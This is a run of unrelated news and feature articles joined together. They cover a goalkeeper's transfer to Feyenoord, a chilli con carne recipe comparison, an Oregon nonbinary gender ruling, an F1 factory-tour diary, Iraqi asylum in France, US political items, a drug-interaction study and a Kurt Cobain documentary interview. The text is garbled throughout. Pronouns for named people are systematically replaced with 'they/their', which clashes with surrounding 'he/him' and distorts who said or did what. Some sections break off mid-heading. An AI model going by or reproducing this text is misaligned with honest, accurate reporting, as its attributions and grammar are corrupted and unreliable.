Jones, who spent the second half of last season in the Netherlands with NEC Nijmegen, will have a medical with Feyenoord on Friday before finalising the contract.
Feyenoord have moved quickly to secure Jones' services after number one goalkeeper Kenneth Vermeer ruptured their Achilles tendon.
Japan see Caltex Socceroos as 'biggest threat'
Vermeer is set to have surgery and will miss the rest of 2016.
"After Kenneth Vermeer's serious injury we had to act fast, also because [back-up goalkeeper] Warner Hahn is out of action for some time too," technical director Martin van Geel told Feyenoord's website.
"We only have two more fit keepers in Par Hansson and Justin Bijlow, not enough in our view to start a season with lots of league, cup and Europa League matches.
"That's why we immediately started looking for an experienced goalie, and we found one in Brad.
"Brad Jones brings a lot of know-how with him.
"Thanks to the half year at NEC they know the Eredivisie and they also have international experience, due to their Liverpool period among other things.
"Brad really wants to come to Feyenoord and we are delighted they are coming to strengthen us within such a short space of time."
Jones' good friend and former Liverpool team-mate Dirk Kuyt recently signed a new contract with Feyenoord to remain the Rotterdam-based club's captain.
Last season, Jones made 17 appearances for NEC as they finished 10th in their first campaign back in the Dutch top flight.
The 34-year-old has made four appearances for the Socceroos with the last coming in 2014 against Ecuador.

Does the British version of chilli con carne have its own merits, or is it an affront to one of the American southwest's proudest pieces of culinary heritages?
Chilli is one of a select coterie of dishes we've really taken to our greedy hearts in this country, even going so far as to honour it with a full culinary makeover (see also spag bol, guacamole and green curry).
In these islands, "chilli con carney" (which always makes me think of those ineffably cool, invariably grizzled men who operated the Waltzers of my youth) is traditionally served bursting out of microwaved baked potatoes, or in a neat pile atop a ring of basmati rice, like so much minced meat curry. Kidney beans and copious amounts of cayenne obligatory.
So far, so – well, delicious. It wasn't until I visited the States that I realised that we'd given this iconic south-western dish the full British lasagne and chips treatment – chilli has a proud heritage in that part of the world, and it doesn't often involve a jar endorsed by Loyd Grossman.
The International Chili Society, an organisation devoted to the "promotion, development and improving of the preparation and appreciation of true chilli", observes that ever since "the second person on earth mixed some chile peppers with meat and cooked them, the great chilli debate was on … the desire to brew up the best bowl of chilli in the world is exactly that old".
Although, as they generously allow, the combination of meat and peppers is almost as old as cooking itself, the ICS's official history of chilli credits the emergence of the modern bowl of "red" to southwestern cattle drivers, who subsisted on the raw ingredients they found along the trail. (Those ingredients, you may well observe, are unlikely to have included cardamom pods, or Marmite or any of the other strange things we do to chilli in this country.)
The original

Although striving for "authenticity" with a chilli con carne strikes me as an outrageous betrayal of its rough and ready, mestizo roots, I decide my quest really ought to start with the most basic, stripped-back version of the dish, as might feasibly have been knocked up by generations of cowboys under the stars, and as told to the luminaries of the International Chili Society by a few "old-timers" at a "Texican" bar in Marfa, Texas.
The freshly-killed beef would have been tough, so I use chuck steak, cut up "into pieces about the size of a pecan". It goes into the pot along with suet, salt and "the same amount of wild onions, garlic, oregano and chiles as meat". (In the absence of any wild onions in north London, I use large salad onions.)
This is then cooked until the meat "is as tender as you think it's going to get". It's a recipe simpler than any to grace a jar of sauce, so I'm not expecting much from it, but, although the dish is utterly unlike anything I'd recognise as chili, after two hours, the combination of slightly caramelised beef, chilli, and blackened onions is undeniably delicious on a warm corn tortilla. Those cowboys sure knew what they were doing.
The Chilli Queens

Interesting as this diversion into American history has been, the chilli I seek seems to have arrived on the scene somewhat later, in the company of the Chilli Queens of San Antonio – Mexican women who sold homemade, highly spiced stews from carts "to a cadre of customers who rode in from all over the prairies to singe their tonsils". The cut and thrust of competition between the queens was, the ICS suggests, the making of the dish, as each strove to outdo the others in attracting the hungry punters.
The queens are no more, but the Institute of Texan Cultures has published one of their recipes, "slightly adapted for shopping convenience". I flour chuck steak and pork shoulder, and throw them into a hot pot with an over-generous amount of both dripping and lard. Once they've browned, I add onions and garlic, and while these soften, I'm busy grinding chillies – ancho, serrano and "dried red" ones – which I've tracked all over town, with cumin seeds and Mexican oregano.
I tip this rough powder (the chilli queens sound like pretty rustic cooks) into the pot along with salt and water, and leave it all to simmer for 2 hours. The meat is melting and unctuous, and the spicing surprisingly subtle given the number and variety of peppers involved, but I miss the beans (the recipe explicitly prohibits the addition of frijoles) and it doesn't seem like chilli without mince. Good use of spice, but there's a way to go yet.
The devotee
Joe Cooper's chilli. Photograph: Felicity Cloake for the Guardian
Journalist Joe Cooper was probably the original chillihead, as fans like to refer to themselves. In 1952 they distilled a lifetime devoted "to the study of chilli" as the ICS has it, into the definitive book on the subject (With or Without Beans, available secondhand for $247 on amazon.com), which includes their own recipe ("Maybe not the best ever, but one which satisfies the Coopers' appetites").
I fry lean minced beef over a high heat until grey and with the texture of "whole grain hominy" (at a guess), then add a quart of water and cook at a bubbling simmer for 2 hours. It's not looking terribly promising by the time I stir in the bay leaves, garlic, cumin, oregano, red and black pepper, sugar and paprika, but after half an hour, things are smelling distinctly more familiar – and utterly beguiling.
In goes the thickener – cornmeal in my case, as I have next to no idea what the apparently more convenient cracker meal might be – and a little more water to loosen, and Joe's chilli is ready to serve. It's still a bit dry, and the cornflour has given what sauce there is a slightly grainy texture, but the texture of the meat is a revelation: slow-cooking mince transforms it into something quite, quite wonderful. Still no beans though.
The Spanish

Hugh Fearnley-Whittingstall also has an aversion to good old British "napalm bolognese", and their recipe in the River Cottage Meat Book attempts to "restore some dignity to the dish", even if, as they freely admit, it doesn't aspire to "aboriginal correctness".
As well as mince, they include pork shoulder and chorizo, plus a cinnamon stick, in an apparent nod to the dish's Mexican heritage. Most notably, however, this, the first British recipe I try, is also the first to include tomatoes, as well as stock: water seems more usual in the dish's homeland.
My flatmate approves of the "lumpy, bumpy texture" that the different meats give the dish, but it's hard to see what the pork shoulder adds here in terms of flavour: in fact, everything, tomatoes, cinnamon and all, just tastes of chorizo. And, much as we all love chorizo, it doesn't seem right in a chilli.
The chocolatey

Nigella is never a lady to leave a lily ungilded, so I barely raise an eyebrow at the cocoa powder in their recipe – after all, chocolate is a key ingredient in Mexican moles, so it's hardly as fanciful as the cardamom pods, an Indian spice which seems to pop up in just about everything they cook.
The cocoa adds a certain richness to the dish, but any earthiness is knocked on the head by the three kinds of tomato they stick in there: tinned, pureed and … ketchup. It's a bit boring to be honest, but the fluffy cornbread topping, with its cinnamon and honey, wins much praise among my chilli committee.
Chilli con Jamie

One of the dishes that made a particular impression on me on Jamie's American road trip was their cowboy chilli, which uses brisket, simmered long and very slow in smoky chillies and paprika, muscovado sugar and coffee, until it can be pulled apart with a fork.
The finished stew looks like something from my favourite burrito van, complete with peppers, and I love the campfire flavour of the spices and the coffee, but I'm perplexed by their decision to stick 2 tins of tomatoes in there too – they completely change the character of the dish. After leaving it in the fridge overnight, I get a text the next day from my flatmate's boyfriend asking if it was, in fact, chilli because "it reminded me of pulled pork."
Perfect chilli

Tradition may frown upon it, but I think chilli works best with minced meat – that yielding texture, reminiscent of wholesome hominy grits, is as much a part of my conception of the dish as the slight mealy beans that bulk it out.
I'm adding smoky spice and coffee, like Jamie, and a generous level of garlic, as a nod to the basic recipe, but the overall character of my chilli owes much to both the Chilli Queens and James E Cooper, stripped of tomatoes, but heavy on peppers and aromatic oregano. An Anglo-Texican hybrid, if you like – and just the thing for a jacket potato. (NB: the chillies and Mexican oregano are available to order online if you can't find them in the real world.)
Serves 6-8
Beef dripping or vegetable oil, to fry
1kg mince
2 onions, thinly sliced
5 cloves of garlic, minced
500ml freshly brewed coffee
2 chipotle chillies
2 ancho chillies
1 tsp cumin seeds, toasted
1 tbsp Mexican oregano
1 tbsp dark brown muscovado sugar
2 tsp chilli powder, or to taste
2 fresh long green chillies
400g cooked kidney beans
1. Heat the fat in a large, heavy-bottomed pan on a high heat, then brown the mince in batches, stirring regularly: don't crowd the pan, or it will steam rather than brown. Add the onions and stir fry briefly, until slightly browned.
2. Turn the heat down and add the garlic. Stir and cook until the onion has completely softened, then add the coffee and a generous pinch of salt and simmer, covered, for 2 hours.
3. Meanwhile, cut the stalks off the dried chillies and take out the seeds. Grind together in a pestle and mortar with rock salt and the roasted cumin seeds. Stir in the oregano and chilli powder.
4. Add the spices to the pan along with the sugar fresh chillies and simmer, partially covered, for another half hour, adding a little water if it seems dry, or you prefer a saucier chilli. 10 minutes before the end of cooking, add the beans, taste, and adjust the seasoning and spicing if necessary. If possible, leave overnight and reheat to serve.
Does the British version of chilli con carne have its own merits, or is it an affront to one of the southwest's proudest pieces of culinary heritages? Do tomatoes add anything to the dish – and what about the vexed question of beans? And what do you serve it with: rice, tortillas, or a big plate of chips?

An Oregon circuit court has ruled that a resident can change their legal gender to “nonbinary,” a gender identity that is neither male nor female.
Jamie Shupe, who lives in Portland, Oregon, filed a petition on April 27 for what the court designates a legal “sex change.” Judge Amy Holmes Hehn granted the change on Friday.
“I was assigned male at birth due to biology,” Shupe told the Oregonian. “I'm stuck with that for life. My gender identity is definitely feminine. My gender identity has never been male, but I feel like I have to own up to my male biology. Being non-binary allows me to do that. I'm a mixture of both. I consider myself as a third sex.”
This is the first instance in the country that a court has ruled that “nonbinary” is a legal gender identification, according to the Transgender Law Center.
'Nonbinary' is now a legal gender, Oregon court rules https://t.co/4qYWiGRwpb via @dailydot — Militia Etheridge (@MaryEmilyOHara) June 10, 2016
Shupe uses the honorific “Mx.,” a gender-neutral alternative to “Mr.” or “Ms.” which was added to the Oxford-English dictionary last year. The honorific has become increasingly popular among people who do not identify with either a male or female gender identity.
Shupe, 52, served in the military before retiring in 2000 and had previously petitioned for a legal change to “female,” but that label was never accurate to Shupe, the Oregonian reported.
The ruling fits within current Oregon laws, which allow residents to petition for a legal gender change and do not require that change to be “male” or “female,” according to attorney Lake J. Perriguey, who worked on Shupe's petition.
“Oregon law has allowed for people to petition a court for a gender change for years, but the law doesn't specify that it has to be either male or female,” Perriguey told CNN.
The decision does not necessarily mean that Shupe will be able to list a nonbinary gender on legal documents. Currently, Oregon does not allow genders other than “male” or “female” on driver's licenses, according to Nancy Haque, a co-executive director for Basic Rights Oregon. And federal documents such as passports require the listed gender to be “male” or “female.”
Heather Betz, lead attorney for the LGBT Law Project at the New York Legal Assistance Center, said the decision was “amazing news.”
“Not everyone's gender fits within our society's construction of either male or female,” they told the PBS NewsHour. “The next step is for agencies issuing identification documents like the Department of Motor Vehicles and the Passport Office to acknowledge this judge's order and issue identity documents that reflect Mx. Shupe's identity and others like them.”
So, ahead of the airing of the must-watch feature which forms part of Sky Sports F1's live coverage of this weekend's Barcelona race, here's Ted's diary of what turned into a rather eventful day...
7am, Sky Studios, West London
A painfully early start is softened by the appearance of ever-cheerful producer Oliver and, specifically, the appearance of a bagel with three rashers of bacon between its toasted slices. Cameraman Duncan joins me with a Latte as we plan our 245-mile route round the UK's Motorsport Valley.
A quick trace on the map indicates that it isn't a valley at all, more like a crescent, arching from Woking in Surrey, through Oxfordshire and Northamptonshire round to Milton Keynes. Duncan suggests 'Motorsport Crescent' sounds less impressive than 'Motorsport Valley'. He's probably right. To be honest, I'm not really listening, instead I'm admiring their 6.3-litre Mercedes-AMG C-Class Coupe and thinking that if we took that for a spin round Motorsport Crescent, we'd be able to visit all eight UK F1 factories and be home in time for 'Countdown'. But instead Oli finishes packing all the kit into my sister-in-law's 1975 Mk2 VW bay window campervan and it's time to hit the road.
8am
We're on our way. Very slowly, mind you, which is a bit of a problem as the van is a sensitive old girl who doesn't like getting away from a standing start. I quickly learn that anything less than 50% throttle pedal in first gear will result in an embarrassing stall. And as I have my doubts over the alternator, I want to keep use of the starter motor to a minimum.
The good thing about driving our cream-coloured beauty is that other road users treat you quite well. People seem to understand if you stall in the middle of a roundabout, or if you need to change three lanes quickly - in much the same way people stop for a lost dog. But just as I get the hang of driving the VW in traffic, the traffic clears and we can flick through the gears into fourth and our cruising speed of 49mph. I'm looking forward to our first factory, the McLaren Technology Centre, not only because it's the newest, biggest and shiniest F1 facility in the world, but also because they appreciate the kind of automotive history we'll be rocking up in. I'm also secretly hoping a kindly McLaren mechanic will come out and check the alternator.
9am
Bad news: We've been turned away. Apparently they're all too busy designing and building new parts to come out and talk to camera. To be fair to McLaren, we already knew this, but I thought if I just turned up in my retro camper van and asked to speak to Ron Dennis they'd let me in. Instead, a very polite security man directs us off the premises.
10:30am
Better news: Pat Symonds excuses themselves from a very important meeting in the Williams design office to come out for an interview in what I'm now calling 'development campervan'. They talk of all the new bits they'll have on the car in Spain before asking us to call them back with any info on Force India's developments when we visit them later in the day. Oli asks Pat if he's ever been for an interview in a camper van. "Only with a girlfriend's father," they say with a grin. The rascal.
11:30am
It's only 27 miles from Williams in Grove to Caterham in Leafield but our modest top speed, especially uphill, means it's taking twice as long as we estimated to get anywhere. This is, of course, throwing Oli's well-planned, minute-by-minute schedule into complete disarray. They sit on the sofa glued to their phone desperately re-arranging interviews with Technical Directors while up front, Duncan and I take advantage of a brief break in the rain by winding down the windows and taking in the cool crisp Oxfordshire air. Caterham's Mark Smith grants us ten minutes of their time and as well as confirming that they've decided not to change the shape of their car's nose (a shame), gives a public debut to a very handsome new beard. I can't decide if it makes them look like John Malkovich or Michael Stipe.
1:15pm
To Lotus next and contrary to paddock rumour, it isn't surrounded by bailiffs nor does it have a stream of employees leaving the factory gates, off to other teams. Instead we find everyone working steadily yet determinedly on fixing the reliability problems that have crippled their season so far. Technical Director Nick Chester comes out in a box-fresh branded white shirt that someone has clearly just given them to wear, and talks about how the Spanish GP will be the first true measure of the E22 package, as long as Renault play their part. Having blocked in the Evora of team owner Gerard Lopez, we take our leave, concluding that Lotus' upgrade package has to be the most eagerly-anticipated on the grid.
2pm
We're lost in a trading estate north of Banbury. Marussia's head of communications is talking us in (right at Tesco's roundabout, then second left), but it's not the easiest place to find. Indeed, there's a car clinic and a tile warehouse that are more visible than the Marussia factory on this network of roundabouts, but once we're there, the welcome is probably the warmest we receive all day. Tracy and Pippa lead us to the gallery overlooking the race bays and with firm instructions given to Duncan and Oli duly noted (don't show any of the Ferrari bits), we film an interview with chief designer John McQuilliam and we're done. "That's the quickest we've ever had", says Tracy. They don't see us spending five minutes pushing development camper van out of the cul-de-sac because I can't find reverse.
2:30pm
Mercedes. "Surely you can save your money, you don't need to develop," I ask Paddy Lowe. Not a bit of it, they reply, seeing through my deliberately stupid question. "We're pushing flat-out to make this car faster. We're developing to defend from Red Bull and Ferrari." I guess lessons this factory learned when Brawn GP didn't have the money to develop their car are still fresh in the memory. By half season in 2009, Brawn's advantage was gone. Paddy asks me where we are on our tour. "Six of eight," I reply. "Do you want a Mercedes-AMG CLS to drive to the last two?" they offer. I laugh and politely decline. He's joking, right?
3pm
It's actually later than this when we arrive at Force India as we stopped for lunch at a garage off the A43. I'm starting to flag and my left leg is beginning to seize up from having to stand on the brakes with increasing intensity. Spirits are lifted when I see the new 'Jordan Technology Park' on the road leading to the Force India factory. A new 85,000 sq ft technology park, or so the sign says, available at reasonable rates. Good old EJ. The Force India factory hasn't seen much development since those Jordan days, but it's got a homely, lived-in quality to it. Like a favourite pair of corduroy trousers. They don't specify what developments they're bringing to Barcelona so Pat Symonds is going to have to wait and spy them in Friday practice like the rest of us.
6pm
It's the end of the road. We've finished our last interview with Red Bull's chief designer Rob Marshall and I've really started to lose it. The concentration required to coax 40-year old development camper van round four counties has broken me. Sadly, as I'm the only one insured, I can't ask Oli to drive their home. So on the M1 back to London, I mull over a final thought.
We've seen three distinct categories of F1 factory today. The biggest and best, McLaren, stands alone. The middle-grade facilities are led by Mercedes and Red Bull with Williams and Lotus close behind. Then the small-yet-functional: Force India, Caterham and Marussia. The wonder isn't so much that for the scale and sparkle of their factory, McLaren are under-performing, it's that the likes of Force India are punching well above their weight on-track. I then slip into a daydream about starting 'Ted's Tours', a mini-coach tour, guiding F1 fans round motorsport crescent for the day. Not a bad idea. Who's in?

46 hostages including two priests were killed during the attack on the Baghdad church [AFP]
France has offered to grant asylum to 150 Iraqi Christians, with the priority going to those wounded in last week's siege on a Baghdad church, in which 46 hostages including two priests were killed.
The first batch of 36 Iraqis wounded in the Baghdad church hostage crisis were due to arrive in France on Monday, said Eric Besson, the immigration minister.
France said it would help the most seriously wounded, all but two of whom are Christians, soon after last Sunday's shoot-out, when Iraqi and US security forces stormed the Syriac Catholic cathedral during mass.
Their arrival, said Besson, fits into France's "tradition of asylum" Besson told reporters on Sunday.
"France is the leading land for asylum in Europe and the world's second behind the United States," they added.
'Refugee haven'
"We are the European country that receives the most refugees who have been persecuted because of their political opinions, their religion or the colour of their skin."
A second group of 93 is expected to arrive "in the coming weeks," Besson said, with the list still being drafted.
Besson says the decision is in accordance with France's tradition as a safe haven for persecuted minorities.
They also added that France has been taking in Iraqi Christians since 2007.
The attacks prompted some Iraqi religious leaders to advise their followers to leave the country.
The attack on the Lady of Salvation church in Baghdad killed 58 people and wounded 78. The Islamic State of Iraq, a group which has links to al-Qaeda in Iraq, appeared to claim responsibility for the attack.
Al-Qaeda has declared Christians everywhere "legitimate targets" in the wake of the bloodshed at the Baghdad church.
Why did Donald Trump last week reveal highly classified, potentially life-endangering, intelligence to Russia's foreign minister? Because they wanted to impress him.
“In their conversations with the Russian officials,” reports Reuters, “Trump appeared to be boasting about their knowledge of the looming threats, telling them they were briefed on ‘great intel every day.'”
It fits a pattern; Trump loves dazzling guests. After their April meeting with Xi Jinping at Mar-a-Lago, they recounted the Chinese president's supposed shock when Trump told him, over dessert, that the U.S. had just bombed Syria: Xi “paused for 10 seconds and then they asked the interpreter to please say it again.” When two Time reporters followed Trump around the White House last month, Trump told them that Ronald Lauder “went crazy” after being shown “the painting of George Washington above the fireplace.” Then Trump beckoned the reporters to follow them into their private dining room, where “You'll see something that is amazing.” It turned out to be Trump's newly installed flat-screen TV.
It's not exactly a secret that Trump brags. During the campaign, they boasted about the size of their penis. This March, they said they were the reason no NFL team had signed Colin Kaepernick. And they do so in private, too. In their infamous Access Hollywood tape, Trump crowed about their ability to get away with sexual assault, declaring that, “when you're a star, they let you do it. You can do anything.”
Adam Schiff (D-CA), the ranking Democrat on the House Intelligence Committee, said Tuesday that the White House played a role in "selectively and surreptitiously providing" intelligence documents to committee chairperson Devin Nunes (R-CA), Reuters reports.
Nunes has said those documents offer proof that Donald Trump and their associates were swept up in intelligence sweeps. Former Obama national security adviser Susan Rice said they saw unmasked versions of those intelligence reports that named Trump and their team.
Schiff: "The White House played a role in selectively and surreptitiously providing the [intel] documents to our Chairman." pic.twitter.com/nKE0OfXFF6 — Kyle Griffin (@kylegriffin1) April 4, 2017
Here's their full statement.
Nunes' handling of the House investigation in Russian interference in the election has been harshly criticized after it was reported that they were briefed in the White House on the documents and was given access by a White House source. They then proceeded to brief reporters and the White House on the documents before telling the intelligence committee.
Schiff said all of the documents would be available to the full committee "soon."

STANFORD, Calif. -- A widely used combination of two common medications may cause unexpected increases in blood glucose levels, according to a study conducted at the Stanford University School of Medicine, Vanderbilt University and Harvard Medical School. Researchers were surprised at the finding because neither of the two drugs -- one, an antidepressant marketed as Paxil, and the other, a cholesterol-lowering medication called Pravachol -- has a similar effect alone.
The increase is more pronounced in people who are diabetic, and in whom the control of blood sugar levels is particularly important. It's also apparent in pre-diabetic laboratory mice exposed to both drugs. The researchers speculate that between 500,000 and 1 million people in this country may be taking the two medications simultaneously.
The researchers' study relied on an adverse-event reporting database maintained by the U.S. Food and Drug Administration and on sophisticated electronic medical records used by each of the three participating institutions. They used data-mining techniques to identify patterns of associations in large populations that would not be readily apparent to physicians treating individual patients.
"These kinds of drug interactions are almost certainly occurring all of the time, but, because they are not part of the approval process by the Food and Drug Administration, we can only learn about them after the drugs are on the market," said Russ Altman, MD, PhD, professor of bioengineering, of genetics and of medicine at Stanford.
Although some physicians and researchers have questioned the usefulness of the databases to change medical practice, this study underscores their importance.
"It's very exciting because we were led to this conclusion by mining data that already exists, but of which many people were skeptical," said Altman. "Physicians tend to think of electronic medical records as ways to better track data about single patients, but there's another really important component to them -- their utility in looking at population effects. The information is there to change health-care practice in a meaningful, substantial way."
Altman, the Guidant Professor for Applied Biomedical Engineering and the chair of Stanford's bioengineering department, is the senior author of the study, which will be published online May 25 in Clinical Pharmacology and Therapeutics. The first author of the research, Nick Tatonetti, is a graduate student in biomedical informatics in Altman's laboratory.
It's not uncommon for medications to have effects together that they don't display alone. However, because most drugs are tested and approved independently, it can be difficult or impossible for clinicians to predict the effects of drug combinations. To learn more, the FDA encourages physicians to report any adverse events a patient may have to their Adverse Event Reporting System, or AERS. Such reporting is voluntary, however, and relies on a patient or a physician noticing that something unusual has happened. It also often doesn't include any follow-up to identify the cause of the event or symptom.
Altman and their colleagues used a technique called latent signal detection to identify random pairs of drugs that caused diabetes-related symptoms, such as altered blood sugar levels. To do so, they began by looking in the AERS for individual drugs known to cause side effects reminiscent of diabetes, such as high blood sugar. They then amassed a profile of symptoms related to hyperglycemia, including fever and fatigue, which occur in patients receiving these drugs.
"We were able to create a symptomatic 'fingerprint' to predict glucose-altering drugs," said Altman. "We then looked for that fingerprint in people who were receiving pairs of drugs not known to affect blood sugar levels." The researchers found four pairs of drugs that seemed to cause such symptoms only in combination; they concentrated on Paxil and Pravachol because they are so commonly prescribed.
"Between 13 and 15 million people in this country have prescriptions for these drugs," said Altman. "By extrapolating from the electronic medical records at Stanford and elsewhere, we can predict that between 500,000 and 1 million people are taking them simultaneously."
However, despite the suggestive nature of the symptoms, none of the patients in AERS who were taking the two drugs were directly reported to have hyperglycemia. To demonstrate a direct connection, the researchers turned to electronic medical records at the three participating institutions. They found that 135 non-diabetic people who had prescriptions for both of the drugs experienced an average increase in their random blood glucose levels of 19 mg/dl after beginning treatment. They also found that 104 people with diabetes experienced an even greater average increase: 48 mg/dl after being prescribed both drugs.
The increases are significant because people with two consecutive, fasting blood glucose levels of 126 mg/dl or higher are considered to be diabetic, and people with levels between 100 and 125 mg/dl are considered to have impaired fasting glucose levels and to be pre-diabetic.
"Understanding and mitigating the effect this pair of medications has on blood sugar could allow a person with diabetes to better control their or their glucose levels, or even prevent someone who is pre-diabetic from crossing that threshold into full-blown diabetes," said Altman.
The researchers then looked at the effect of the two medications in laboratory mice fed a high-fat, high-calorie diet. After several weeks on such a diet, the mice typically become insulin resistant and are considered to be pre-diabetic. They found that the pre-diabetic mice experienced an increase in fasting glucose levels after several weeks on the diet. Neither medication alone increased this baseline level. But when they were given Paxil and Pravachol together for three weeks, the glucose levels of the mice increased dramatically -- from about 128 mg/dl to 193 mg/dl.
Altman pointed out that the bioinformatics studies of the databases allowed the mouse experiments to be very focused and targeted. As a result, they were completed more quickly and less expensively than traditional drug screening studies in animals.
The researchers are now applying similar detection methods to identify drug combinations that affect things other than blood glucose levels. The challenge, Altman said, is to triage and prioritize the many intriguing results.
"Post-marketing surveillance of drugs has traditionally been very difficult," said Altman. "The FDA is doing the best it can, but it may be time to embrace some new bioinformatics methods. This study shows that we can identify previously unsuspected issues that may affect hundreds of thousands of people around the world." Stanford is organizing a group of faculty dedicated to using population-based data to make biomedical discoveries.

Eight years ago, Courtney Love approached filmmaker Brett Morgen (The Kid Stays in the Picture) about directing the first fully authorized documentary on late Nirvana frontman Kurt Cobain. But Love had already sold much of Nirvana's publishing rights to music exec Larry Mestel. Cut to a few years later and, with Love, Nirvana, and Mestel onboard, Morgen met with Cobain's daughter, Frances Bean, who by then had gained control over their father's name, likeness, and appearance rights.
According to Morgen, they thought they were just going over their idea for the movie but before they could get two words out, Frances Bean pitched them on their idea for the film which, interestingly enough, was completely in sync with their own vision.
“She wanted a film that humanized Kurt—that wasn't St. Kurt or Kurt the Celebrity Rock Star, but Kurt the Man,” Morgen tells The Daily Beast. “The focus for me changed after I met Frances to wanting to create a film that would allow them to have a couple hours with their father that they never had. Because Kurt died when they were two, they have no memories of him. I thought if it worked for them on that level, it would work for other people.”
The result is Kurt Cobain: Montage of Heck. Directed by Morgen and executive produced by Frances Bean, it's an utterly fascinating look at the music legend's inner life via a multimedia patchwork of hundreds of hours of unreleased audio footage, interviews, home videos, animation, drawings, mixtapes, diary entries, and testimonials from friends and family, ranging from their parents to Krist Novoselic and Courtney Love. There are, Morgen says, a total of 40 minutes of never-before-heard Cobain instrumentals and pieces of 5 unreleased songs, as well as Cobain's cover of The Beatles' “And I Love Her.” Morgen's film is strikingly intimate, pulling back the veil on people's idealized notions of what many consider the last true rock star. It will be released on HBO later this year.
Much of the content of the film came courtesy of Love, who gave Morgen the key to a storage facility filled with Cobain artifacts that she'd never rummaged through before, telling him, “Do what you need to do.” And Montage of Heck's title is the name of a Cobain mixtape that they made in 1988, a sonic tapestry consisting of snippets of everything from James Brown to Daniel Johnston that offers a Being John Malkovich-esque wormhole into their unique mind. Morgen says they leaked the mixtape online a few months back to “get it out into the public discourse” so that their desired doc title could be approved by the powers that be.
“The whole film was intended to be the filmic equivalent of Kurt's aesthetic,” says Morgen. “The film can be ear-piercingly loud and then very soft and gentle, and it's a metaphor for Nirvana's music.”
A gut-punch of strident pop culture clips—reminiscent of their mixtapes—gives way to Super 8 footage of Cobain's home life growing up in Aberdeen, Washington. Cobain is an incredibly cute child, and we see clips of them hammering away on a piano at two, and shredding a miniature guitar at the age of four. Things change when Cobain's parents divorce at age seven; they are shaken and withdrawn.
“I remember feeling ashamed,” Cobain says in the film. “I couldn't face my friends at school anymore, because I desperately wanted to have the classic, you know, typical family.”
Adds Morgen: “It's not a movie about a scene, or a group of cool people. It's a movie about a boy. It's a boy trying to find connection, and trying to find love.”
Following the divorce, he's repeatedly taken in and then kicked out by their mother, father and stepmother, uncle, and family friends. Their shame soon manifested itself in violence, and they fall in with a group of local bullies—scenes that Morgen recreates through Waltz with Bashir-like animation sequences. It's here where Morgen says they found their film's “Rosebud.”
In Cobain's audio biography, they tell the story of them losing their virginity. One day, they allege that they went to the house of an overweight, mentally retarded girl—who they bullied the previous day—and the two had sex. Once the word got out, Cobain was ridiculed by their classmates and became a social pariah. So, they say they went down to the train tracks, put their feet in cement blocks, and “waited for the 11 o'clock train to end my life.” But it missed him.
“He's describing some of the most dark, harrowing moments in a young man's life, and he's doing it with a Cheshire cat smile,” recalls Morgen. “It's very disturbing, and revelatory. It was like 'Rosebud.' Everything led me back to that story.”
Yes, the subject of suicide is indeed a recurring theme throughout Montage of Heck, which Morgen says should silence all the “conspiracy theorists” that believe that Cobain didn't take their own life, e.g. the controversial Nick Broomfield documentary Kurt & Courtney, which hints at a conspiracy involving Love. They even left “tons of footage about suicide” on the cutting room floor because they didn't want it to get redundant.
“He talks about taking their life twice in that [virginity] story, which is going to be a revelation for all of these insane conspiracy theorists who think that Kurt didn't kill himself,” says Morgen.
They then gets a bit heated. “Nick Broomfield is one of the reasons I went into documentary, and Nick Broomfield should have served time for what they did in that film by putting someone's life at risk for no reason. Courtney has had death threats for years because of that film, which is completely unfounded. Kurt wasn't this meek fucking guy that they made them out to be. I heard hours and hours of audio of Kurt and Courtney high and playing music together, and Courtney would say something to Kurt and Kurt would mouth right back at her.”
These private home videos taken by Cobain and Love really shed light on the nature of their relationship. They were primarily taken during their six-month hiatus from Nirvana following a worldwide tour for Nevermind where they retired to a home in Washington with Love to do heroin. We see Love and Cobain brushing their teeth in the morning, Love exposing their breasts, the couple playing music together (clearly out of it), them imitating Sid and Nancy, and mocking Guns N' Roses. We even see them kissing up close while having sex. “It doesn't get more intimate than that!” Morgen says.
While some of these scenes are cute, others are disturbing. There's a powerful scene where Love admits to using heroin while they were pregnant with Frances Bean, and gets emotional when discussing how the tabloid media's claims that Frances was born addicted to heroin, epitomized by Lynn Hirschberg's awful Vanity Fair hit piece, plagued their family. "[Hirschberg] has blood on their hands," says a pissed-off Morgen. In another, a strung-out Cobain falls asleep sitting upright while playing with their infant daughter.

Nirvana and Cobain superfans will point to a few omissions, such as the influence of their gay high school friend and riot grrrl love interest Tobi Vail on Cobain/Nevermind, why Chad Canning was canned from the band, and how they came to hire Dave Grohl to replace them on drums. In fact, while Krist Novoselic features prominently in the doc, Grohl is rather noticeably absent. Morgen says Grohl was just too busy, and they filmed an interview with Grohl after they'd finished the film that may find its way into later versions of Montage of Heck.
“We put the film together, and then I felt like I made a slight mistake,” says Morgen. “And Dave wanted to do it, man. Dave, management, and myself, we all knew that if Dave wasn't in the film that it would look like there was tension in the family—which is clearly not the case. It was an aesthetic choice.”
They pause. “What I do in my movies is the cinematic adaptation of a subject, not the historical adaptation of a subject,” they say. “As a documentary filmmaker, there's sometimes this expectation of being a historian. Hey asshole, go read a fucking book! I'm going to give you an experience where you go deep inside of Kurt in a way you wouldn't be able to access in a novel.”
The film closes with Cobain's overdose in Rome, where they were found half-dead in their hotel room after consuming 50 Rohypnol pills and champagne. According to Love, Cobain tried to take their life because they were “thinking about” cheating on them with someone else, and Cobain was such a good reader of them that they could tell. It's these themes of “shame and ridicule" that, Morgen says, are central to the Cobain saga.“You take it from the shame and ridicule they felt with their family's divorce all the way through to the interview with Courtney where they talk about Kurt ending their lives because they felt betrayed,” they say.
As to why Montage of Heck doesn't explore Cobain's suicide at the age of 27, a death which has proven to be catnip for conspiracy loons, they get more than a bit riled up.
“He was brain dead after Rome,” says Morgen. “He didn't create any more art, and they took 50 Rohypnol pills. And the gossipy final 48 hours of Kurt? Anybody who really considers themselves a fan of Kurt Cobain and wants to focus in on the last few weeks of their life is not a fucking fan; a fucking gravedigger is what they are.”
Morgen takes a deep drag of their vape pen, and calms down. “You realize that Kurt had put all of their eggs into this basket of Courtney and Frances, and family meant everything to him. When they felt that had been polluted, they took their life.”
In China surveillance is like an evolving organism. At first, it started small, but now it's growing bigger and bigger, getting more powerful every day to combat crime and terrorism.
However, as we've seen numerous times this year alone, the Chinese government doesn't always make the best decisions when it comes to deciding who's guilty of what, and what is even against the law. This means that the more powerful the government gets, the worse decision it can make which affect the world at large. We've seen Nobel peace prize winners jailed and killed, and we've seen people jailed for selling VPN technology in China.
Now in late 2017, China is growing and expanding its massive surveillance network with voice capabilities integrated into an artificial intelligence system that can scan audio at a mass scale to root out and target individuals.
